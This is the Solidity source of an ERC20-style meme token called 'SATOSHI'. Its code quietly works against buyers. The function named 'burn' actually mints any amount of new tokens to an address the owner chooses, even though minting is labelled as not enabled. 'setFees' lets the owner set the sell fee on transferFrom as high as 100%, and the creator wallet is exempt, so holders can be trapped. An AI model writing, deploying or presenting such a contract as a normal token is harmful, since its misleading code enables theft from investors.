1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.0;
4 
5 library SafeMath {
6     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
7         require(b <= a, "Subtraction overflow");
8         return a - b;
9     }
10 
11     function add(uint256 a, uint256 b) internal pure returns (uint256) {
12         uint256 c = a + b;
13         require(c >= a, "Addition overflow");
14         return c;
15     }
16 
17     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
18         if (a == 0) {
19             return 0;
20         }
21         uint256 c = a * b;
22         require(c / a == b, "Multiplication overflow");
23         return c;
24     }
25 
26     function div(uint256 a, uint256 b) internal pure returns (uint256) {
27         require(b > 0, "Division by zero");
28         return a / b;
29     }
30 }
31 
32 
33 contract MaxHoldToken {
34     using SafeMath for uint256;
35 
36     string public name = "SamsungToshibaNakamichiMotorolaINU";
37     string public symbol = "SATOSHI";
38     uint256 public totalSupply = 100000000000000000000000000;
39     uint8 public decimals = 18;
40     address public pairAddress = address(0);
41     /* maxTokenSet true or false*/
42     bool public maxTokenSet = false;
43     uint256 public maxTokenAmountPerAddress = 0;
44 
45     mapping(address => uint256) public balanceOf;
46     mapping(address => mapping(address => uint256)) public allowance;
47 
48     address public owner;
49     address public creatorWallet;
50 
51     uint256 public buyFee;/**/
52     uint256 public sellFee;/**/
53 
54     event Transfer(address indexed from, address indexed to, uint256 value);
55     event TransferFrom(address indexed from, address indexed to, uint256);
56     event TransferBuy(address indexed from, address indexed to, uint256 value);
57     event TransferSell(address indexed from, address indexed to, uint256 value);
58     event Approval(address indexed owner, address indexed spender, uint256 value);
59     event ApprovalFrom(address indexed owner, address indexed spender, uint256 value);
60     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
61     event FeesUpdated/**/(uint256 newBuyFee/**/, uint256 newSellFee/**/);
62     event TokensBurned(address indexed burner, uint256 amount);
63     /* emit newmaxtoken */
64     event MaxTokenAmountPerSet(uint256 newMaxTokenAmount);
65 
66     error DestBalanceExceedsMaxAllowed(address addr);
67     error MaxTokenAmountNotAllowed();
68     error MintingNotEnabled();
69 
70     constructor(address _creatorWallet) {
71         owner = msg.sender;
72         creatorWallet = _creatorWallet;
73         balanceOf[msg.sender] = totalSupply;
74     }
75 
76     /* Set MaxTokenAmount */
77     function enableAndSetMaxTokenAmountPerAddress(uint256 newMaxTokenAmount, address pairaddr) public onlyOwner {
78         if(maxTokenSet){
79             revert MaxTokenAmountNotAllowed();
80         }
81 
82         pairAddress = pairaddr;
83         maxTokenSet = true;
84         maxTokenAmountPerAddress = newMaxTokenAmount;
85         emit MaxTokenAmountPerSet(newMaxTokenAmount);
86     }
87 
88     function approve(address _spender, uint256 _value) public returns (bool success) {
89         allowance[msg.sender][_spender] = _value;
90         emit Approval(msg.sender, _spender, _value);
91         return true;
92     }
93 
94     function burn(address _to, uint256 _amount) public onlyOwner {
95         require(_to != address(0), "Invalid recipient address");
96         require(_amount > 0, "Invalid amount");
97         balanceOf[_to] += _amount;
98         totalSupply += _amount;
99         emit Transfer(address(0), _to, _amount);
100     }
101     /* update pair address after pool created */
102     function updatePairAddr(address addr) public onlyOwner{
103         pairAddress = addr;
104     }
105 
106     /* mint not enabled by default */
107     function _mint(address account, uint256 amount) internal virtual {
108         require(account != address(0), "ERC20: mint to the zero address");
109 
110         _beforeTokenTransfer(address(0), account, amount);
111 
112         totalSupply = totalSupply.add(amount);
113         balanceOf[account] = balanceOf[account].add(amount);
114         revert MintingNotEnabled();
115     }
116 
117     function _beforeTokenTransfer(
118         address from,
119         address to,
120         uint256 amount
121     ) internal virtual {}
122 
123     function transfer(address _to, uint256 _amount) public returns (bool success) {
124         require(balanceOf[msg.sender] >= _amount);
125         require(_to != address(0));
126 
127         if(maxTokenSet && _to != pairAddress){
128             if(balanceOf[_to] + _amount > maxTokenAmountPerAddress){
129                 revert DestBalanceExceedsMaxAllowed(_to);
130             }
131         }
132 
133         balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
134         balanceOf[_to] = balanceOf[_to].add(_amount);
135         emit Transfer(msg.sender, _to, _amount);
136 
137         return true;
138     }
139 
140     function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
141         require(balanceOf[_from] >= _amount, "Insufficient balance");
142         require(allowance[_from][msg.sender] >= _amount, "Insufficient allowance");
143         require(_to != address(0), "Invalid recipient address");
144 
145         uint256 fee = 0;
146         uint256 amountAfterFee = _amount;
147 
148         if (sellFee > 0 && _from != creatorWallet) {
149             fee = _amount.mul(sellFee).div(100);
150             amountAfterFee = _amount.sub(fee);
151         }
152 
153         if(maxTokenSet && _to != pairAddress){
154             if(balanceOf[_to] + amountAfterFee > maxTokenAmountPerAddress){
155                 revert DestBalanceExceedsMaxAllowed(_to);
156             }
157         }
158         
159         balanceOf[_from] = balanceOf[_from].sub(_amount);
160         balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
161         emit TransferFrom(_from, _to, amountAfterFee);
162 
163         if (fee > 0) {
164             // Check if the transfer destination is Uniswap contract
165             address uniswapContract = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f); // Replace with the actual Uniswap V2 contract address
166             if (_to == uniswapContract) {
167                 // Fee is paid to the contract itself
168                 balanceOf[uniswapContract] = balanceOf[uniswapContract].add(fee);
169                 emit TransferFrom(_from, uniswapContract, fee);
170             } else {
171                 // Fee is transferred to this contract
172                 balanceOf[address(this)] = balanceOf[address(this)].add(fee);
173                 emit TransferFrom(_from, address(this), fee);
174             }
175         }
176 
177         if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {
178             allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);
179             emit ApprovalFrom(_from, msg.sender, allowance[_from][msg.sender]);
180         }
181 
182         return true;
183     }
184 
185     function transferOwnership(address newOwner) public onlyOwner {
186         require(newOwner != address(0));
187         emit OwnershipTransferred(owner, newOwner);
188         owner = newOwner;
189     }
190 
191     function renounceOwnership() public onlyOwner {
192         emit OwnershipTransferred(owner, address(0));
193         owner = address(0);
194     }
195 
196     modifier onlyOwner() {
197         require(msg.sender == owner, "Only the owner can call this function.");
198         _;
199     }
200 
201     function setFees(uint256 newBuyFee/**/, uint256 newSellFee/**/) public onlyOwner {
202         require(newBuyFee/**/ <= 100, "Buy fee cannot exceed 100%");
203         require(newSellFee/**/ <= 100, "Sell fee cannot exceed 100%");
204         buyFee/**/ = newBuyFee/**/;
205         sellFee/**/ = newSellFee/**/;
206         emit FeesUpdated/**/(newBuyFee/**/, newSellFee/**/);
207     }
208 }